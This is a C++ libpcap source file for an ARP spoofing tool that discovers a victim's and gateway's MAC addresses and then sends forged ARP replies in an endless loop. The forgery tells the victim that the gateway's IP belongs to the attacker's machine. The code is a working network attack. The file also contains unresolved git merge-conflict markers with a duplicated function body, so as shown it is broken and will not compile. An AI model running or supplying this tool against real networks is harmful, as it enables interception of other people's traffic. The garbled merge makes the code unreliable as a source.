#include <pcap.h>   // pcap libc
#include <unistd.h>
#include <iostream>
#include <cstdlib>
#include <cstring>
#include <netinet/ether.h> // find_me
#include <net/ethernet.h>   // find_me
#include <arpa/inet.h>  // inet libc
#include <thread>       // Thread libc
#include "header.h"     // header define

using namespace std;

#define FILTER_RULE "arp "

uint8_t find_chk_V = 0;
uint8_t find_chk_G = 0;

pcap_t *use_dev;
struct ether_addr my_mac;
struct sockaddr_in my_ip;
struct sockaddr_in G_victim_ip;
struct sockaddr_in G_gateway_ip;
uint8_t victim_mac[6];
uint8_t gateway_mac[6];

void err_print(int err_num)
{
    switch(err_num)
    {
    case 0:
        cout <<"send_ARP [Interface] [Sender_IP] [Gateway_IP]" <<endl;
        break;
    case 1:
        cout <<"PCAP_OPEN_ERROR!\n" <<endl;
        break;
    case 2:
        cout <<"PCAP_COMPILE_ERROR!\n" <<endl;
        break;
    case 3:
        cout <<"PCAP_SET_FILTER_ERROR!\n"<<endl;
        break;
    case 4:
        cout <<"THREAD_CREATE_ERROR!\n"<<endl;
        break;
    default:
        cout <<"Unknown ERROR!\n"<<endl;
        break;

    }
}

void init_dev(char *dev_name)
{
    char errbuf[ERRBUF_SIZ];
    struct bpf_program rule_struct;

    if((use_dev=pcap_open_live(dev_name,SNAPLEN,1,1000,errbuf))==NULL)
    {
        err_print(1);
        exit(1);
    }

    if(pcap_compile(use_dev,&rule_struct,FILTER_RULE,1,NULL)<0)
    {
        err_print(2);
        exit(1);
    }
    if(pcap_setfilter(use_dev,&rule_struct)<0)
    {
        err_print(3);
        exit(1);
    }
     cout <<":: DEVICE SETTING SUCCESS ::"<<endl;
}

void find_mac(const uint8_t *pkt_data,char *victim_ip,char *gateway_ip)
{
<<<<<<< HEAD
    struct arp_header *ah;
    ah = (struct arp_header *)pkt_data;

    struct sockaddr_in victim;
    struct sockaddr_in gateway;

    inet_aton(victim_ip,&victim.sin_addr);
    inet_aton(gateway_ip,&gateway.sin_addr);

    if(ah->s_ip.s_addr == victim.sin_addr.s_addr&&!find_chk_V)
    {
        memcpy(victim_mac,ah->s_mac,sizeof(ah->s_mac));

        cout << "VICTIM_MAC FIND!\nVICTIM_MAC : ";
        for(int i=0; i<6; i++)
            printf("%02X ",victim_mac[i]);
        cout <<"\n"<<endl;
        find_chk_V = 1;
    }

    if(ah->s_ip.s_addr == gateway.sin_addr.s_addr && !find_chk_G)
    {
        memcpy(gateway_mac,ah->s_mac,sizeof(ah->s_mac));

        cout << "GATEWAY_MAC FIND!\nGATEWAY_MAC : ";
        for(int i=0; i<6; i++)
            printf("%02X ",gateway_mac[i]);
        cout <<"\n"<<endl;
        find_chk_G=1;
    }
}

void find_me(char *dev_name)
{
    FILE *ptr;
    char MAC[20];
    char IP[20]={0,};
    char cmd[300]={0x0};

    //MY_MAC FIND
    sprintf(cmd,"ifconfig %s | grep HWaddr | awk '{print $5}'",dev_name);
    ptr = popen(cmd, "r");
    fgets(MAC, sizeof(MAC), ptr);
    pclose(ptr);
    ether_aton_r(MAC, &my_mac);

    //MY_IP FIND
    sprintf(cmd,"ifconfig %s | egrep 'inet addr:' | awk '{print $2}'",dev_name);
    ptr = popen(cmd, "r");
    fgets(IP, sizeof(IP), ptr);
    pclose(ptr);
    inet_aton(IP+5,&my_ip.sin_addr);
}

void cap_pkt(char *victim_ip,char *gateway_ip)
{
    struct pcap_pkthdr *header;
    const uint8_t *pkt_data;
    int res;

   while((res = pcap_next_ex(use_dev,&header,&pkt_data))>=0)
    {
        if(res == 0) continue;
        pkt_data += sizeof(struct eth_header);
        find_mac(pkt_data,victim_ip,gateway_ip);
    }
}

void send_arp(char *victim_ip,char *gateway_ip)
{
    struct mine m;
    uint8_t packet[42];
    inet_aton(gateway_ip,&G_gateway_ip.sin_addr);
    inet_aton(victim_ip,&G_victim_ip.sin_addr);

    if(!find_chk_G||!find_chk_V)
    {
        memcpy(m.src_mac,my_mac.ether_addr_octet,6);
        memcpy(m.s_mac,my_mac.ether_addr_octet,6);
        m.s_ip=my_ip.sin_addr;
        m.t_ip=G_victim_ip.sin_addr;
        memcpy(packet,&m,42);

        //VICTIM_BROADCAST
        if(pcap_sendpacket(use_dev,packet,42)!=0)
        {
            printf("SEND PACKET ERROR!\n");
            exit(1);
        }

        m.t_ip=G_gateway_ip.sin_addr;
        memcpy(packet,&m,42);
        //GATEWAY_BROADCAST
        if(pcap_sendpacket(use_dev,packet,42)!=0)
        {
            printf("SEND PACKET ERROR!\n");
            exit(1);
        }
    }

    else
    {
        memcpy(m.des_mac,victim_mac,6);
        memcpy(m.src_mac,my_mac.ether_addr_octet,6);
        m.s_ip=G_gateway_ip.sin_addr;
        memcpy(m.s_mac,my_mac.ether_addr_octet,6);
        m.t_ip=G_victim_ip.sin_addr;
        memcpy(m.t_mac,victim_mac,6);
        memcpy(packet,&m,42);

       if(pcap_sendpacket(use_dev,packet,42)!=0)
            {
                printf("SEND_PACKET_ERROR!\n");
                exit(1);
            }
       cout<< "SEND_ARP!\n"<<endl;
       sleep(1);
    }

}

int main(int argc, char **argv)
{
    if(argc != 4)
    {
        err_print(0);
        return -1;
    }

    init_dev(argv[1]);
    thread t1(cap_pkt,argv[2],argv[3]);
    find_me(argv[1]);

    while(1) send_arp(argv[2],argv[3]);

    t1.join();

}











=======
    switch(err_num)
    {
    case 0:
        cout <<"send_ARP [Interface] [Sender_IP] [Gateway_IP]" <<endl;
        break;
    case 1:
        cout <<"PCAP_OPEN_ERROR!\n" <<endl;
        break;
    case 2:
        cout <<"PCAP_COMPILE_ERROR!\n" <<endl;
        break;
    case 3:
        cout <<"PCAP_SET_FILTER_ERROR!\n"<<endl;
        break;
    case 4:
        cout <<"THREAD_CREATE_ERROR!\n"<<endl;
        break;
    default:
        cout <<"Unknown ERROR!\n"<<endl;
        break;
    }
}
>>>>>>> 68b2e326a81286f229649560cd50a5b8b14df0d9
